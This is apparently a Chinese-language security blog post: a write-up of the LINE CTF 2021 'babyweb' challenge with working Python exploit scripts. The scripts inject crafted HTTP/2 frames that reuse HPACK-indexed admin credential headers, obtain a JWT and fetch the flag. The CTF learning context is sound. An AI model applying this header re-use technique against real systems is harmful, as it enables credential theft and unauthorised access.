<!DOCTYPE html><html lang="en"><head><meta name="generator" content="Hexo 3.8.0"><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> HTTP/2 Header Field Re-used Attack Trick · TonghuaRoot's BloG. - Cyber security enthusiast, not Hacker.</title><meta name="description" content="HTTP/2 Header Field Re-used Attack Trick - TonghuaRoot"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" href="/favicon.png"><link rel="stylesheet" href="/css/apollo.css"><link rel="search" type="application/opensearchdescription+xml" href="https://tonghuaroot.com/atom.xml" title="TonghuaRoot's BloG. - Cyber security enthusiast, not Hacker."></head><body><div class="wrap"><header><a href="/" class="logo-link"><img src="/favicon.png" alt="logo"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">BLOG</a></li><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link">ARCHIVE</a></li><li class="nav-list-item"><a href="/about" target="_self" class="nav-list-link">ABOUT</a></li><li class="nav-list-item"><a href="https://twitter.com/tonghuaroot" target="_blank" class="nav-list-link">TWITTE</a></li><li class="nav-list-item"><a href="https://github.com/tonghuaroot" target="_blank" class="nav-list-link">GITHUB</a></li><li class="nav-list-item"><a href="/friends" target="_self" class="nav-list-link">FRS</a></li><li class="nav-list-item"><a href="/atom.xml" target="_self" class="nav-list-link">RSS</a></li></ul></header><main class="container"><div class="post"><article class="post-block"><h1 class="post-title">HTTP/2 Header Field Re-used Attack Trick</h1><div class="post-info">Mar 29, 2021</div><div class="post-content"><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>哈喽，大家好，我是童话。</p>
<p>最近一段时间一直没更新博客[1]，一方面是自己懒了，另一方面是由于工作性质的原因，很多工作中有趣的事情也不方便拿出来讲，又没有特别大块的时间去系统的搞一些独立项目、安全研究等，更新博客的事情便一拖再拖。</p>
<p>前阵子偶然看到 @Panda 师傅的公众号，更新频率以及质量都很高，至少我读过之后还是蛮有收获的，能在保持如此更新频率的情况下，还要兼顾质量，对于一个工作党来说，我个人认为这一点非常难得，并且是值得学习的。</p>
<p>说来惭愧，自己在 3 年前也注册过公众号，遗憾的是至今没有更新过一篇文章。</p>
<p><img src="https://files.mdnice.com/user/12658/0c333ba7-888f-4f74-9001-55f29519279e.png" alt></p>
<p>每次写博客的时候，我都在想要输出什么样的内容，最开始写东西的时候我都会事无巨细的写下来，包括操作流程、思考的过程。</p>
<p>有一段时间看到其他博主在写文章的时候只展示关键的操作步骤，并遗漏掉思考的过程，我发现很多安全学术界的论文也有这种现象。</p>
<p>这就导致了一个问题，从读者的角度来看，对于不熟悉的垂直领域，看到这样的文章，乍一看不明觉厉，实际操作起来没有办法复现，干着急，如果读者对这个领域比较熟悉的话，文章本身对他来说又没有特别多的价值，食之无味，弃之可惜。</p>
<p>我也曾经也模仿过这种写作风格，但我发现，这都不是我自己。前阵子在参加 Hacking Club 沙龙的时候，@Snowming 也和我说过，写文章的时候要考虑读者的感受，这样才能保证大家都有收获。</p>
<p>我想确实是这样的，至少几个月之后回头来看，我自己还是可以顺着整个文章完整的对某一个技术点进行复现。</p>
<p>在现实生活中，我并不是一个擅长表达的人，也很少去和朋友谈及我对某一件事情的看法和感受。思来想去，还是决定把这个公众号运营起来，对于这个公众号的定位，一来是分享一些不会太长但绝对有趣的安全技术知识点，另一方面也是向朋友们汇报一下我的近况，互通有无。</p>
<p>对于实时安全漏洞/事件跟进，我也许会发，也许不会发，虽然我很擅长这些，但是我确实不想在公众号运营上花费太多的时间。</p>
<h2 id="0x01-LINE-CTF-2021-babyweb"><a href="#0x01-LINE-CTF-2021-babyweb" class="headerlink" title="0x01 LINE CTF 2021 - babyweb"></a>0x01 LINE CTF 2021 - babyweb</h2><p>好了，啰嗦了这么多，进入今天的正题，来聊一聊  LINE CTF 2021 [2] 中 babyweb 这道题。</p>
<p>（比较有意思的是，在比赛开始之前，我的赛棍学弟 @T4rn 师傅跟我聊到的几个 Web 安全考点，几乎全部命中了。）</p>
<p>先来看一下题目：</p>
<p><img src="https://files.mdnice.com/user/12658/27df3867-cd47-4a91-9a0a-cf72a4a343e1.png" alt></p>
<p>Hint: babyweb/Neko is cute</p>
<p>源码：<a href="https://linectf.me/files/1db709b29e1b03b8f3a53102af0d5d6e/babyweb.tar.gz?token=eyJ1c2VyX2lkIjozMTEsInRlYW1faWQiOjIxOSwiZmlsZV9pZCI6OX0.YF8yeg.0rx3_9pOkTTFO53cmdyjRR5OuQc" target="_blank" rel="noopener">https://linectf.me/files/1db709b29e1b03b8f3a53102af0d5d6e/babyweb.tar.gz?token=eyJ1c2VyX2lkIjozMTEsInRlYW1faWQiOjIxOSwiZmlsZV9pZCI6OX0.YF8yeg.0rx3_9pOkTTFO53cmdyjRR5OuQc</a></p>
<p>题目地址：<a href="http://35.187.196.233/" target="_blank" rel="noopener">http://35.187.196.233/</a></p>
<p><img src="https://files.mdnice.com/user/12658/71fa3964-04c9-4d79-aa38-495ff4e3c443.png" alt></p>
<h2 id="0x02-Writeup"><a href="#0x02-Writeup" class="headerlink" title="0x02 Writeup"></a>0x02 Writeup</h2><p>黑盒大概浏览一下，功能比较简单，【Home】主页，【Note】添加和浏览笔记，直接暴露在外部的就没有其他的功能点了。</p>
<p>翻一下代码，这里比较银杏化的一点是，LINE CTF 的 Web 题目都是用 Docker 搭建的，我们可以把代码保存下来，未来可以用 Docker Compose 一键部署进行测试学习。</p>
<p>本地运行环境（我用的是 CentOS 7，需要提前安装好 Docker 和 Docker Compose）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">sudo yum remove docker \</span><br><span class="line">                  docker-client \</span><br><span class="line">                  docker-client-latest \</span><br><span class="line">                  docker-common \</span><br><span class="line">                  docker-latest \</span><br><span class="line">                  docker-latest-logrotate \</span><br><span class="line">                  docker-logrotate \</span><br><span class="line">                  docker-engine</span><br><span class="line"></span><br><span class="line">sudo yum install -y yum-utils</span><br><span class="line"></span><br><span class="line">sudo yum-config-manager \</span><br><span class="line">    --add-repo \</span><br><span class="line">    https://download.docker.com/linux/centos/docker-ce.repo</span><br><span class="line"></span><br><span class="line">sudo yum install docker-ce docker-ce-cli containerd.io</span><br><span class="line">sudo systemctl start docker</span><br><span class="line"></span><br><span class="line">sudo yum install docker-compose -y</span><br><span class="line"></span><br><span class="line">bash run.sh</span><br></pre></td></tr></table></figure>
<p>如果你的操作系统默认的 Python 为 python2，运行上述命令时，会报错误“SyntaxError: invalid syntax”，修改 run.sh 中的 python 为 python3 即可解决。</p>
<p><img src="https://files.mdnice.com/user/12658/1a46a588-e4ed-4943-9b6c-a094a8eb212c.png" alt></p>
<p>浏览了一下 run.sh、gen.py、docker-compose_tmp.yml 这 3 个文件，运行环境由 3 个 service 支撑，分别为 babyweb_public、babyweb_internal、babyweb_httpd。</p>
<p>由端口映射情况可知，babyweb_httpd 为我们刚刚访问，暴露在外部的服务。由环境变量的设置情况可知，Flag 埋在 babyweb_internal 服务中。</p>
<p>检查在 /home/centos/CTF 目录下所有文本文件中包含 12000、12001 的行号：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">grep -rnw &apos;/home/centos/CTF&apos; -e &apos;12000&apos;</span><br><span class="line">grep -rnw &apos;/home/centos/CTF&apos; -e &apos;12001&apos;</span><br></pre></td></tr></table></figure>
<p><img src="https://files.mdnice.com/user/12658/dc3ee815-cdaf-4804-99b6-b71470915d07.png" alt></p>
<p>通过 httpd/httpd.conf 的文件内容（L552-L563）可知，babyweb_httpd 为一个反向代理，将请求转发到后端的 <a href="http://babyweb_public:12000/" target="_blank" rel="noopener">http://babyweb_public:12000/</a> 中。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line">    ErrorDocument 503 &quot;NOP&quot;</span><br><span class="line">    ErrorDocument 502 &quot;NOP&quot;</span><br><span class="line">    ErrorDocument 501 &quot;NOP&quot;</span><br><span class="line">    ErrorDocument 401 &quot;NOP&quot;</span><br><span class="line">    ErrorDocument 400 &quot;NOP&quot;</span><br><span class="line"></span><br><span class="line">    ProxyRequests Off</span><br><span class="line">    ProxyPreserveHost On</span><br><span class="line">    ProxyPass / http://babyweb_public:12000/</span><br><span class="line">    ProxyPassReverse / http://babyweb_public:12000/</span><br><span class="line">&lt;/VirtualHost&gt;</span><br></pre></td></tr></table></figure>
<p>基于上述信息，猜测完整的交互情况为：外部用户访问 12001 端口（CTF 竞赛环境为 80，自建测试环境为 12001）的 babyweb_httpd 服务，babyweb_httpd 将请求转发至后端的 babyweb_public，babyweb_public 部分功能依赖 babyweb_internal，在某种情况下可以请求拿到 Flag。<br>继续分析一下 public、internal 两个目录下的源码，public 是基于 Flask 开发的 Web 应用，internal 是一个 Node 应用。逆序梳理出获取 Flag 的思路如下，<br>请求 /flag 路由，在请求头中携带正确的 x-token 信息获取 Flag：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://babyweb_internal:8443/flag -&gt; router() -&gt; getFlag() -&gt; req.headers[&apos;x-token&apos;] , checkToken() -&gt; verify() -&gt; decode() -&gt; CONFIG.flag</span><br></pre></td></tr></table></figure>
<p>请求 /auth 路由，在请求头中携带正确的用户名和密码信息，生成 JWT token：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://babyweb_internal:8443/auth -&gt; route() -&gt; auth() -&gt; -&gt; req.headers[CONFIG.header.username], req.headers[CONFIG.header.password], authCheck() -&gt; encode()</span><br></pre></td></tr></table></figure>
<p>babyweb_public 是一个 Flask 应用，其通过 Blueprint 的方式定义了 /internal/health 路由（POST 请求），会向 <a href="https://babyweb_internal:8443/auth" target="_blank" rel="noopener">https://babyweb_internal:8443/auth</a> 和 <a href="https://babyweb_internal:8443/health" target="_blank" rel="noopener">https://babyweb_internal:8443/health</a> 发起请求。<br>我们可以采用如下 HTTP 报文，通过响应内容验证请求已经可以抵达后端 Node 应用：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /internal/health HTTP/1.1</span><br><span class="line">Host: 35.187.196.233</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: session=eyJ1aWQiOiJkZTBmZWJiNS1hYTk5LTQyZjktYWZlZS0yZTE1NTRmNjIzNGIifQ.YGAK1Q.-aUr8s8SrSq0bx6iKZz7D0MsSas</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/json;charset=utf8</span><br><span class="line">Content-Length: 32</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;&quot;type&quot;: &quot;1.1&quot;, &quot;data&quot;: &quot;222&quot;&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://files.mdnice.com/user/12658/4c5b3589-179c-4403-a0c5-b8f2736eee32.png" alt></p>
<p>接下来就是这道题的核心考点，public/src/internal.py#L45-L61：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">elif data[&quot;type&quot;] == &quot;2&quot;:</span><br><span class="line">    conn = create_connection()</span><br><span class="line">    conn.request(&quot;GET&quot;, &quot;/health&quot;)</span><br><span class="line">    resp = conn.get_response()</span><br><span class="line"></span><br><span class="line">    headers = &#123;</span><br><span class="line">        cfg[&quot;HEADER&quot;][&quot;USERNAME&quot;]: cfg[&quot;ADMIN&quot;][&quot;USERNAME&quot;],</span><br><span class="line">        cfg[&quot;HEADER&quot;][&quot;PASSWORD&quot;]: cfg[&quot;ADMIN&quot;][&quot;PASSWORD&quot;]</span><br><span class="line">    &#125;</span><br><span class="line">    conn.request(&quot;GET&quot;, &quot;/auth&quot;, headers=headers)</span><br><span class="line">    resp = conn.get_response()</span><br><span class="line"></span><br><span class="line">    conn._new_stream()</span><br><span class="line">    </span><br><span class="line">    conn._send_cb(data[&quot;data&quot;].encode(&apos;latin-1&apos;))</span><br><span class="line">    conn._sock.fill()</span><br><span class="line">    return conn._sock.buffer.tobytes()</span><br></pre></td></tr></table></figure>
<p>再次梳理一下思路，突破这部分关键代码（public/src/internal.py#L57-L61），通过某种方式获取 JWT token，利用获取到的 JWT Token 请求获取 Flag。</p>
<p>Hyper 是一个基于 Python 实现的 HTTP/2 客户端 [7]，<figure class="highlight plain"><figcaption><span>方法通过连接的 stream socket 发送任意数据，相关的源码为 [8]，也就是说，我们可以利用``` _send_cb() ```方法，在新的 stream 中，创建一个新的 HTTP 请求，即 ```data["data"].encode('latin-1')``` 中的内容。</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">说到这里，要简单科普一下 HTTP/2 中 stream 的概念。在 HTTP/2 中，一个 connection（连接） 被分为多个 stream，每一个 stream 携带单独的 request-response（请求-响应）对 [9]，Hyper 确保每一个响应匹配到正确的请求中。</span><br><span class="line">HPACK 是 HTTP/2 用于压缩编码 Header 信息的压缩算法规范，hpack 是一个 Python 第三方库，提供 Python 接口实现 HPACK 压缩算法，用于压缩 HTTP/2 中的 HTTP Header [11]。</span><br><span class="line"></span><br><span class="line">*We also found out that HTTP2 has Huffman Coding and some of useful information can be re-referenced and re-used in the upcoming stream.[6]*</span><br><span class="line"></span><br><span class="line">HTTP/2 采用 Huffman 编码，在 upcoming stream 中一些有价值的信息可以被 re-referenced/re-used。</span><br><span class="line"></span><br><span class="line">Hyper 压缩算法会将 HTTP Header 中的常用字符串用数字来代替 ，以此来减少 Header 中的字节数。这个 Huffman 编码是说，将一些高频次出现的数字采用更精简的字节来代替，比如对于数字 1 来说，我们可以采用 8 bit 的 1 个 byte 来表示，也可以直接采用 1 bit 来表示，以此来使 HTTP Header 的整体字节数更少。我们前面提到过，一个 HTTP/2 connection 包含多个 stream，每一个 stream 都会携带单独的 request-response（请求-响应）对，每一个 request 都存在一个 Header 信息，Header 中的字段可以视为 name-value 的有序集合，字段的顺序在经过 Hyper 压缩算法压缩前后顺序不变，所以此时，我们的思路就是通过遍历字段索引（index）方式即可获取到每一个 Header 字段。</span><br><span class="line"></span><br><span class="line">（由于是在同一个 HTTP/2 connection 中，不同的 stream 的 Header 字段，由同一个有序集合进行维护。 这里涉及到 Indexing Tables 的概念，一个 connection 维护一个 Indexing Tables，Static Table 为协议规定的 61 个 Index 是固定不变的，这道题目自定一的两个 Header 字段（x-user-&#123;uuid4()&#125;、x-pass-&#123;uuid4()&#125;）为 Dynamic Table 表中的内容。关于这部分详细且权威的介绍，可以参考 RFC 文档。[12]）</span><br><span class="line"></span><br><span class="line">结合题目的代码来看，在 ```conn._new_stream()``` 这个新的 stream（upcoming stream） 创建之前，向 /auth 发起过请求，且之前的请求 Header 中是包含了正确的用户名和密码字段的，如果我们可以通过遍历 Header 字段索引（index）的办法 re-used（重用）这两个 Header 字段（x-user-&#123;uuid4()&#125;、x-pass-&#123;uuid4()&#125;），再次向 /auth 发起请求的话，就可以顺利拿到 JWT Token 了。</span><br><span class="line">构造获取 JWK Token 的利用代码如下：</span><br></pre></td></tr></table></figure></p>
<p>import requests<br>import hpack<br>from hyperframe.frame import *</p>
<p>def header(id, idx):<br>    enc = hpack.Encoder()</p>
<pre><code>h1 = enc._encode_indexed(idx)
h2 = enc._encode_indexed(idx + 1)
ha = enc.encode({
    &apos;:path&apos;: &apos;/auth&apos;,
    &apos;:method&apos;: &apos;GET&apos; })

hb = enc.encode({
    &apos;:authority&apos;: &apos;babyweb_internal&apos;,
    &apos;:scheme&apos;: &apos;https&apos;
})
h = ha + hb + h1 + h2

p = HeadersFrame(id, h)
p.flags.add(&apos;END_HEADERS&apos;)
p = p.serialize()
return p
</code></pre><p>sess = requests.Session()<br>HOST = ‘35.187.196.233’</p>
<p>for i in range(62, 128):<br>    r = sess.post(‘http://‘ + HOST + ‘/internal/health’, json={<br>        ‘data’: b’’.join([header(5, i)]).decode(‘latin-1’),<br>        ‘type’: ‘2’<br>    })</p>
<pre><code>content = r.content
print(&quot;&quot;)
print(i)
print(content)
while content:
    frame, length = Frame.parse_frame_header(content[:9])
    print(frame, length)
    content = content[9 + length:]
</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">可以获取到 token 信息如下：</span><br></pre></td></tr></table></figure>
<p>65<br>b’\x00\x00\x02\x01\x04\x00\x00\x00\x05\x88\xbe\x00\x00\xab\x00\x01\x00\x00\x00\x05{“result”:true,”token”:”eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE2MTY5NDM3NDd9.05Vevw3TUfheBwhdztDZbpgavsjVDm6tQIW99gODYR0”}’<br>HeadersFrame(Stream: 5; Flags: END_HEADERS):  2<br>DataFrame(Stream: 5; Flags: END_STREAM):  171<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">剩下的内容就简单了，我们拿着获取到的 token 构造一个新的 HTTP/2 请求，相关漏洞利用代码如下：</span><br></pre></td></tr></table></figure></p>
<p>import requests<br>import hpack<br>from hyperframe.frame import *</p>
<p>def header(id):<br>    enc = hpack.Encoder()<br>    h = enc.encode({<br>        ‘:path’: ‘/flag’,<br>        ‘:method’: ‘GET’,<br>        ‘:authority’: ‘babyweb_internal’,<br>        ‘:scheme’: ‘https’,<br>        ‘x-token’: ‘eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE2MTY5NDM3NDd9.05Vevw3TUfheBwhdztDZbpgavsjVDm6tQIW99gODYR0’<br>    })<br>    p = HeadersFrame(id, h)<br>    p.flags.add(‘END_HEADERS’)<br>    p = p.serialize()<br>    return p</p>
<p>sess = requests.Session()<br>HOST = ‘35.187.196.233’<br>r = sess.post(‘http://‘ + HOST + ‘/internal/health’, json={<br>    ‘data’: b’’.join([header(5)]).decode(‘latin-1’),<br>    ‘type’: ‘2’<br>})<br>content = r.content<br>print(content)<br>while content:<br>    frame, length = Frame.parse_frame_header(content[:9])<br>    print(frame, length)<br>    content = content[9 + length:]<br><code>`</code></p>
<p>最终获取到 Flag 为：LINECTF{this_ch4ll_1s_really_baby_web}</p>
<p><img src="https://files.mdnice.com/user/12658/52b870de-6919-48bb-95ce-3a0e60b1e5eb.png" alt></p>
<h2 id="0x03-后记"><a href="#0x03-后记" class="headerlink" title="0x03 后记"></a>0x03 后记</h2><p>这道题目还是蛮有意思的，总结一下，核心的考点是利用 HPACK 在同一个 connection 的不同的 stream 中使用相同的 Indexing Tables 这一特性导致的 Header 字段重用。</p>
<p>另外，目前，CTF 的线上环境仍然是有效的，有兴趣的读者可以直接访问做一些测试。我这边也将赛题环境和漏洞利用代码备份到了 Github 上留存，地址为：<a href="https://github.com/tonghuaroot/My-CTF-Web-Challenges/tree/main/LINE%20CTF%202021/babyweb" target="_blank" rel="noopener">https://github.com/tonghuaroot/My-CTF-Web-Challenges/tree/main/LINE%20CTF%202021/babyweb</a> </p>
<h2 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 参考链接"></a>0x04 参考链接</h2><p>[1] TonghuaRoot’s BloG. - Cyber security enthusiast, not Hacker. - <a href="https://tonghuaroot.com/">https://tonghuaroot.com/</a></p>
<p>[2] LINE CTF 2021 <a href="https://linectf.me/" target="_blank" rel="noopener">https://linectf.me/</a></p>
<p>[3] What is the difference between docker-compose ports vs expose <a href="https://stackoverflow.com/questions/40801772/what-is-the-difference-between-docker-compose-ports-vs-expose" target="_blank" rel="noopener">https://stackoverflow.com/questions/40801772/what-is-the-difference-between-docker-compose-ports-vs-expose</a></p>
<p>[4] How do I find all files containing specific text on Linux? <a href="https://stackoverflow.com/questions/16956810/how-do-i-find-all-files-containing-specific-text-on-linux" target="_blank" rel="noopener">https://stackoverflow.com/questions/16956810/how-do-i-find-all-files-containing-specific-text-on-linux</a></p>
<p>[5] Install Docker Engine on CentOS <a href="https://docs.docker.com/engine/install/centos/" target="_blank" rel="noopener">https://docs.docker.com/engine/install/centos/</a></p>
<p>[6] LINE CTF 2021 Writeup - babyweb <a href="https://hackmd.io/@stypr233/linectf#babyweb" target="_blank" rel="noopener">https://hackmd.io/@stypr233/linectf#babyweb</a></p>
<p>[7] Hyper: HTTP/2 Client for Python <a href="https://hyper.readthedocs.io/en/latest/index.html" target="_blank" rel="noopener">https://hyper.readthedocs.io/en/latest/index.html</a></p>
<p>[8] _send_cb() <a href="https://github.com/python-hyper/hyper/blob/development/hyper/http20/connection.py#L625-L642" target="_blank" rel="noopener">https://github.com/python-hyper/hyper/blob/development/hyper/http20/connection.py#L625-L642</a></p>
<p>[9] Streams <a href="https://hyper.readthedocs.io/en/latest/quickstart.html#streams" target="_blank" rel="noopener">https://hyper.readthedocs.io/en/latest/quickstart.html#streams</a></p>
<p>[10] HPACK和twitter hpack源码解析 <a href="https://www.jianshu.com/p/96f21b9b4fd5" target="_blank" rel="noopener">https://www.jianshu.com/p/96f21b9b4fd5</a></p>
<p>[11] hpack: HTTP/2 Header Compression for Python <a href="https://python-hyper.org/projects/hpack/en/stable/" target="_blank" rel="noopener">https://python-hyper.org/projects/hpack/en/stable/</a></p>
<p>[12] Indexing Tables <a href="https://tools.ietf.org/html/rfc7541#section-2.3" target="_blank" rel="noopener">https://tools.ietf.org/html/rfc7541#section-2.3</a></p>
</div></article></div></main><footer><div class="paginator"><a href="/2020/11/25/This-is-a-test-page-for-testing-Github-Action/" class="next">NEXT</a></div><div class="copyright"><p>© 2008 - 2021 <a href="https://tonghuaroot.com">TonghuaRoot</a>.</p></div></footer></div><script async src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML" integrity="sha384-crwIf/BuaWM9rM65iM+dWFldgQ1Un8jWZMuh3puxb8TOY9+linwLoI7ZHZT+aekW" crossorigin="anonymous"></script></body></html>